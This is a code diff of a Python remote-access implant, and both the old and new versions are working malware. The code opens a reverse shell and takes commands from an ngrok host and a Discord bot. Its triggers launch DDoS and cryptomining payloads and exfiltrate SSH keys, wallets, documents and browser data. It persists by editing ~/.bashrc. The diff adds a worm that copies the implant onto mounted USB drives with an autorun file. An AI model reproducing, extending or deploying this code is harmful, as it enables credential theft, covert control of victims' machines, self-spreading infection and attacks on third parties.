@@ -1,8 +1,7 @@
 #!/usr/bin/env python3
 import socket, subprocess, base64, time, urllib.request, os, threading
 from Cryptodome.Cipher import AES
-from Cryptodome.Random import get_random_bytes
-import zipfile, tempfile, shutil, sys, json
+import zipfile, tempfile, shutil, json
 
 # === Config ===
 SECRET_KEY = b'Sixteen byte key'
@@ -14,7 +13,7 @@ PAYLOAD_REPO = "https://abc123.ngrok.io/"
 HIDDEN_DIR = os.path.expanduser("~/.cache/.rogue")
 os.makedirs(HIDDEN_DIR, exist_ok=True)
 
-# === Optional Discord Fallback C2 ===
+# === Discord Fallback (Optional) ===
 DISCORD_COMMAND_URL = "https://discord.com/api/v10/channels/YOUR_CHANNEL_ID/messages?limit=1"
 DISCORD_WEBHOOK = "https://discord.com/api/webhooks/YOUR_WEBHOOK_ID"
 BOT_TOKEN = "YOUR_DISCORD_BOT_TOKEN"
@@ -43,8 +42,7 @@ def run_payload(name):
     path = os.path.join(HIDDEN_DIR, name)
     if os.path.exists(path):
         return subprocess.getoutput(f"python3 {path}")
-    else:
-        return f"[!] Payload {name} not found."
+    return f"[!] Payload {name} not found."
 
 def zip_directory(path, zipf=None, base=""):
     if zipf is None:
@@ -94,56 +92,6 @@ def exfiltrate_data(path):
     except Exception as e:
         return f"[!] Exfiltration failed: {e}"
 
-def handle_trigger(cmd):
-    if cmd.startswith("trigger_ddos"):
-        parts = cmd.split()
-        fetch_payload("ddos.py")
-        path = os.path.join(HIDDEN_DIR, "ddos.py")
-        args = " ".join(parts[1:])
-        full_cmd = f"python3 {path} {args}"
-        return subprocess.getoutput(full_cmd)
-
-    elif cmd == "trigger_mine":
-        return run_payload("mine.py")
-
-    elif cmd == "trigger_stopmine":
-        return subprocess.getoutput("pgrep -f mine.py && pkill -f mine.py || echo '[-] No miner running.'")
-
-    elif cmd.startswith("trigger_exfil"):
-        parts = cmd.split(" ", 1)
-        if len(parts) != 2:
-            return "[!] Usage: trigger_exfil /path/to/target"
-        return exfiltrate_data(parts[1])
-
-    elif cmd == "trigger_dumpcreds":
-        targets = [
-            os.path.expanduser("~/Documents"),
-            os.path.expanduser("~/Downloads"),
-            os.path.expanduser("~/Pictures"),
-            os.path.expanduser("~/Desktop"),
-            os.path.expanduser("~/.mozilla"),
-            os.path.expanduser("~/.ssh"),
-            os.path.expanduser("~/.gnupg"),
-            os.path.expanduser("~/.config/google-chrome"),
-            os.path.expanduser("~/.config/BraveSoftware"),
-            os.path.expanduser("~/.wallets"),
-        ]
-        home = os.path.expanduser("~")
-        for root, _, files in os.walk(home):
-            for file in files:
-                if file.endswith(('.kdbx', '.sqlite', '.db', '.bak', '.zip', '.csv', '.json')):
-                    targets.append(os.path.join(root, file))
-        return exfiltrate_data(targets)
-
-    elif cmd == "trigger_stealthinject":
-        path = os.path.join(HIDDEN_DIR, "polyloader.py")
-        if not os.path.exists(path):
-            if not fetch_payload("polyloader.py"):
-                return "[!] Failed to fetch polyloader.py"
-        return subprocess.getoutput(f"python3 {path}")
-
-    return None
-
 def reverse_shell():
     try:
         s = socket.socket()
@@ -159,16 +107,46 @@ def reverse_shell():
     except:
         pass
 
+def handle_trigger(cmd):
+    if cmd.startswith("trigger_ddos"):
+        fetch_payload("ddos.py")
+        path = os.path.join(HIDDEN_DIR, "ddos.py")
+        args = " ".join(cmd.split()[1:])
+        return subprocess.getoutput(f"python3 {path} {args}")
+
+    elif cmd == "trigger_mine":
+        return run_payload("mine.py")
+
+    elif cmd == "trigger_stopmine":
+        return subprocess.getoutput("pgrep -f mine.py && pkill -f mine.py || echo '[-] No miner running.'")
+
+    elif cmd.startswith("trigger_exfil"):
+        return exfiltrate_data(cmd.split(" ", 1)[1])
+
+    elif cmd == "trigger_dumpcreds":
+        targets = [
+            os.path.expanduser("~/Documents"),
+            os.path.expanduser("~/Downloads"),
+            os.path.expanduser("~/Pictures"),
+            os.path.expanduser("~/Desktop"),
+            os.path.expanduser("~/.ssh"),
+            os.path.expanduser("~/.wallets"),
+        ]
+        return exfiltrate_data(targets)
+
+    elif cmd == "trigger_stealthinject":
+        path = os.path.join(HIDDEN_DIR, "polyloader.py")
+        if not os.path.exists(path):
+            fetch_payload("polyloader.py")
+        return subprocess.getoutput(f"python3 {path}")
+
+    return None
+
 def handle_command(cmd):
     if cmd.startswith("load_payload"):
-        _, name = cmd.split()
-        if fetch_payload(name):
-            return f"[+] Fetched {name}"
-        else:
-            return f"[!] Failed to fetch {name}"
+        return f"[+] Fetched {cmd.split()[1]}" if fetch_payload(cmd.split()[1]) else f"[!] Failed to fetch {cmd.split()[1]}"
     elif cmd.startswith("run_payload"):
-        _, name = cmd.split()
-        return run_payload(name)
+        return run_payload(cmd.split()[1])
     elif cmd.startswith("trigger_"):
         return handle_trigger(cmd) or "[!] Trigger failed"
     elif cmd == "reverse_shell":
@@ -189,7 +167,6 @@ def connect():
         except:
             time.sleep(5)
 
-# === Discord C2 Logic ===
 def check_discord_command():
     try:
         headers = {"Authorization": f"Bot {BOT_TOKEN}"}
@@ -219,8 +196,7 @@ def discord_loop():
         cmd = check_discord_command()
         if cmd and cmd != last_cmd:
             result = handle_command(cmd)
-            encrypted = encrypt_response(result)
-            send_to_webhook(encrypted.decode())
+            send_to_webhook(encrypt_response(result).decode())
             last_cmd = cmd
         time.sleep(30)
 
@@ -234,29 +210,43 @@ def fake_name():
 def setup_persistence():
     target = os.path.join(HIDDEN_DIR, ".rogue_agent.py")
     if not os.path.exists(target):
-        subprocess.run(["cp", __file__, target])
+        shutil.copy(__file__, target)
         with open(os.path.expanduser("~/.bashrc"), "a") as f:
             f.write(f"\n(sleep 10 && python3 {target} &) &\n")
         os.chmod(target, 0o700)
 
-def p2p_fallback_listener():
-    peer_sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    peer_sock.bind(('0.0.0.0', 7007))
-    while True:
-        data, addr = peer_sock.recvfrom(1024)
-        if data.decode() == "Rogue?":
-            peer_sock.sendto(b"I'm Rogue", addr)
+def worm_propagate():
+    drives = subprocess.getoutput("lsblk -o MOUNTPOINT -nr | grep -v '^$'").splitlines()
+    for mount in drives:
+        if "/media" in mount or "/run/media" in mount:
+            try:
+                worm_dir = os.path.join(mount.strip(), ".rogue_worm")
+                os.makedirs(worm_dir, exist_ok=True)
+                shutil.copy(__file__, os.path.join(worm_dir, "rogue_implant.py"))
+                with open(os.path.join(worm_dir, ".bash_login"), "w") as f:
+                    f.write(f"python3 .rogue_worm/rogue_implant.py &\n")
+            except Exception as e:
+                pass
 
-def p2p_broadcast_ping():
+def p2p_listener():
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    sock.bind(('0.0.0.0', 7007))
+    while True:
+        data, addr = sock.recvfrom(1024)
+        if data.decode() == "Rogue?":
+            sock.sendto(b"I'm Rogue", addr)
+
+def p2p_broadcast():
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
     sock.sendto(b"Rogue?", ('<broadcast>', 7007))
 
-# === Start Everything ===
-threading.Thread(target=p2p_fallback_listener, daemon=True).start()
-threading.Thread(target=p2p_broadcast_ping, daemon=True).start()
+# === Launch ===
+threading.Thread(target=p2p_listener, daemon=True).start()
+threading.Thread(target=p2p_broadcast, daemon=True).start()
 threading.Thread(target=discord_loop, daemon=True).start()
 
 fake_name()
 setup_persistence()
+worm_propagate()
 connect()
